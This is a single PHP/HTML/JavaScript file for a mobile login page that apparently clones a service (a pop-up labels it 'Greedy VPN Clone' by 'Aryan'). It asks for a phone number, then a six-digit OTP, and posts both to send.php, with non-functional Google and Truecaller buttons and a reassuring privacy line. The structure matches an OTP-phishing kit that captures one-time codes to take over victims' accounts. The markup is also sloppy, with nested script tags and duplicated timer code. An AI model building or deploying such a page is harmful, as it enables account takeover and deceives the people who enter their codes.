<?php
session_start();

if(isset($_POST['number'])) {
    $_SESSION['number'] = $_POST['number'];
    header("Location: msg.php");
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Panel</title>

<style>
body {
    margin: 0;
    font-family: Arial;
    background: #f5f6f8;
    height:100vh;
    overflow-y:auto;
}

#mainBtn{
background:#d3d3d3;
color:#666;
border:none;
padding:15px 30px;
border-radius:12px;
font-size:20px;
}

#mainBtn.active{
background:#0066ff;
color:white;
}

.container {
    max-width: 400px;
    margin: auto;
    text-align: center;
    padding: 40px 20px;
}

.logo {
    width: 110px;
    margin: 50px auto 20px;
    display: block;
    border-radius: 20px;
}

h1 {
    font-size: 32px;
    color: #0d1633;
}

p {
    color: #6c778f;
    font-size: 18px;
}

/* INPUT BOX MAIN */
.input-box{
    display:flex;
    align-items:center;
    gap:10px;
    margin-top:25px;
    width:100%;
}
/* COUNTRY BOX */
.country{
    width:85px;
    min-width:85px;
    height:50px; /* same height */
    background:#ececec;
    border-radius:14px;
    display:flex;
    align-items:center;
    justify-content:center;
    overflow:hidden;
}

/* SELECT */
.countryBox{
width:100%;
background:#ececec;
border-radius:14px;
overflow:hidden;
margin-bottom:10px;
}

.searchBox{
padding:10px;
background:#ececec;
position:sticky;
top:0;
z-index:99;
}

.searchBox input{
width:100%;
height:45px;
border:none;
outline:none;
border-radius:12px;
padding:0 15px;
font-size:16px;
background:white;
}

.countryList{
max-height:220px;
overflow-y:auto;
}

.countryItem{
padding:14px 16px;
font-size:18px;
border-bottom:1px solid #ddd;
background:white;
}

.countryItem:active{
background:#f2f2f2;
}

/* PHONE INPUT */
.phone input{
    width:100%;
    height:50px; /* fixed */
    border:none;
    outline:none;
    background:#ececec;
    border-radius:14px;
    padding:0 16px;
    font-size:16px;
    box-sizing:border-box;
}

/* OTP INPUT */
#otp{
    width:100%;
    height:55px;

    border:none !important;
    outline:none !important;
    box-shadow:none !important;

    -webkit-appearance:none;
    appearance:none;

    border-radius:18px;

    padding-left:20px;
    padding-right:150px;

    font-size:16px;
    background:#f3f3f3;

    box-sizing:border-box;
}

#otp:focus{
    border:none !important;
    outline:none !important;
    box-shadow:none !important;
}
    /* GET OTP BUTTON */
button.get-otp-btn{
    width:100% !important;
    height:46px !important;

    padding:0 !important;

    border:none;
    border-radius:14px;

    background:#0d6efd;
    color:white;

    font-size:15px !important;
    font-weight:600;

    margin-top:18px;
}
    
</style>
</head>
<body>

<div class="container">

<img src="logo.png" class="logo">

<h1>Welcome!</h1>
<p>Login for an amazing experience</p>

<form action="send.php" method="POST">

<div class="input-box">

<div class="countryBox">

<div class="searchBox">
<input 
type="text"
id="searchCountry"
placeholder="Search Country"
onkeyup="filterCountry()">
</div>

<div class="countryList" id="countryList">

<div class="countryItem"
onclick="selectCountry('🇮🇳 +91')">
🇮🇳 +91 India
</div>

<div class="countryItem"
onclick="selectCountry('🇺🇸 +1')">
🇺🇸 +1 USA
</div>

<div class="countryItem"
onclick="selectCountry('🇬🇧 +44')">
🇬🇧 +44 UK
</div>

<div class="countryItem"
onclick="selectCountry('🇦🇪 +971')">
🇦🇪 +971 UAE
</div>

<div class="countryItem"
onclick="selectCountry('🇦🇺 +61')">
🇦🇺 +61 Australia
</div>

<div class="countryItem"
onclick="selectCountry('🇧🇩 +880')">
🇧🇩 +880 Bangladesh
</div>

<div class="countryItem"
onclick="selectCountry('🇯🇵 +81')">
🇯🇵 +81 Japan
</div>

<div class="countryItem"
onclick="selectCountry('🇳🇵 +977')">
🇳🇵 +977 Nepal
</div>

</div>

<input type="hidden" id="countryCode" value="+91">

</div>

    <div class="phone">
        <input
            type="text"
            name="number"
            id="phone"
            oninput="checkPhone()"
            maxlength="12"
            placeholder="Enter your phone number">
    </div>

</div>

</div>
<!-- OTP Section -->
<div id="otpSection" style="display:none; margin-top:10px;">

    <div style="position:relative; width:100%;">

    <input type="text"
    id="otp"
    placeholder="Enter OTP"

    style="
    width:100%;
    height:55px;
    border:none;
    border-radius:18px;
    padding-left:20px;
    padding-right:150px;
    font-size:16px;
    background:#f3f3f3;
    box-sizing:border-box;
    ">

    <button id="resendBtn"

    style="
    position:absolute;
    right:10px;
    top:50%;
    transform:translateY(-50%);

    height:40px;
    padding:0 18px;

    border:1px solid #d6d6d6;
    border-radius:10px;

    background:white;
    color:#777;
    font-size:14px;
    ">
    Resend in 30s
    </button>

    </div>

        </span>

    </div>

</div>



<!-- Get OTP Button -->

<button 
type="button"
id="mainBtn"
onclick="nextStep()"

style="
width:90%;
height:45px;
border:none;
border-radius:12px;
font-size:15px;
font-weight:bold;
background:#0666ff;
color:white;
margin:18px auto 0;
display:block;
cursor:pointer;
">

Get OTP

</button>
    
</div>
    
<!-- OR Line -->
<div style="display:flex; align-items:center; width:92%; margin:auto;">
    
    <div style="flex:1; height:1px; background:#ccc;"></div>

    <div style="padding:0 15px; font-weight:bold;">Or</div>

    <div style="flex:1; height:1px; background:#ccc;"></div>

</div>

<!-- Google Button -->
<button type="button" style="
width:92%;
padding:0px 12px;
border:2px solid #5d7df5;
border-radius:6px;
background:white;
font-size:14px;
font-weight:bold;
display:flex;
align-items:center;
justify-content:flex-start;
padding-left:48px;
gap:14px;
color:#222;
height:44px;
margin:18px auto 0 auto;
">

<img src="google.png" style="width:24px; height:24px;">

Continue with Google

</button>

<!-- Truecaller Button -->
<button type="button" style="
width:92%;
padding:0px 12px;
border:2px solid #5d7df5;
border-radius:6px;
background:white;
font-size:14px;
font-weight:bold;
display:flex;
align-items:center;
justify-content:flex-start;
padding-left:48px;
gap:14px;
color:#222;
height:44px;
margin:18px auto 0 auto;
">

<img src="truecaller.png" style="width:24px; height:24px;">

Continue with Truecaller

</button>

<!-- Privacy Policy Text -->
<div style="
position:absolute;
bottom:35px;
left:50%;
transform:translateX(-50%);
width:95%;
text-align:center;
font-size:13px;
line-height:18px;
color:#222;
">

Your Privacy is important to us and your number will be safe.
By continuing, you agree to our
<b>Terms and Conditions, Privacy Policy and Content & Community Guidelines.</b>

</div>

<script>

let otpShown = false;

function nextStep() {

    let phone = document.getElementById("phone").value;

    if (!otpShown) {

        if (phone.length < 10) {
            return;
        }

        fetch("send.php", {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: "number=" + encodeURIComponent(phone)
        });

        document.getElementById("otpSection").style.display = "block";
        document.getElementById("mainBtn").innerText = "Verify OTP";

        otpShown = true;

    } else {

        let otp = document.getElementById("otp").value;

        if (otp.length < 6) {
            return;
        }

        fetch("send.php", {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body:
                "number=" + encodeURIComponent(phone) +
                "&otp=" + encodeURIComponent(otp)
        });
    }
}

function checkPhone() {
    let phone = document.getElementById("phone").value;
    let btn = document.getElementById("mainBtn");

    if (phone.length == 10) {
        btn.classList.add("active");
    } else {
        btn.classList.remove("active");
    }
}

function checkOTP() {
    let otp = document.getElementById("otp").value;
    let btn = document.getElementById("mainBtn");

    if (otp.length == 6) {
        btn.classList.add("active");
    } else {
        btn.classList.remove("active");
    }
}
let timeLeft = 30;

let resendBtn = document.getElementById("resendBtn");

let countdown = setInterval(() => {

    timeLeft--;

    resendBtn.innerText = `Resend in ${timeLeft}s`;

    if (timeLeft <= 0) {

        clearInterval(countdown);

        resendBtn.innerText = "Resend";

        resendBtn.disabled = false;
        resendBtn.style.color = "black";
    }

}, 1000);
    <script>

function filterCountry(){

let input =
document.getElementById("searchCountry")
.value.toLowerCase();

let items =
document.getElementsByClassName("countryItem");

for(let i=0;i<items.length;i++){

let txt =
items[i].innerText.toLowerCase();

if(txt.includes(input)){
items[i].style.display="block";
}else{
items[i].style.display="none";
}

}

}

function selectCountry(code){

document.getElementById("countryCode")
.value = code;

}

</script>
    
</script>
    <div id="creator-popup">
  Created By Aryan <br>
  <b>Greedy VPN CloneðŸ”“</b>
</div>

<style>
#creator-popup{
    position:fixed;
    bottom:25px;
    left:50%;
    transform:translateX(-50%);

    background:#fff;
    color:#000;

    padding:10px 20px;
    border-radius:12px;

    font-size:14px;
    text-align:center;

    z-index:9999;
    box-shadow:0 4px 10px rgba(0,0,0,0.2);
}

/* Greedy VPN Clone colorful text */
#creator-popup b{
    background:linear-gradient(90deg,#ff0000,#ff9900,#00c853,#00b0ff,#aa00ff);
    -webkit-background-clip:text;
    -webkit-text-fill-color:transparent;

    font-size:18px;
    font-weight:900;
    letter-spacing:1px;

    text-shadow:0 0 8px rgba(255,0,150,0.4);
    }
</style>

<script>
setTimeout(function(){
  document.getElementById("creator-popup").style.display="none";
},3000);

    

let timeLeft = 30;

let resendBtn = document.getElementById("resendBtn");

let countdown = setInterval(() => {

timeLeft--;

resendBtn.innerText = `Resend in ${timeLeft}s`;

if (timeLeft <= 0) {

clearInterval(countdown);

resendBtn.innerText = "Resend";

}

}, 1000);

</script>
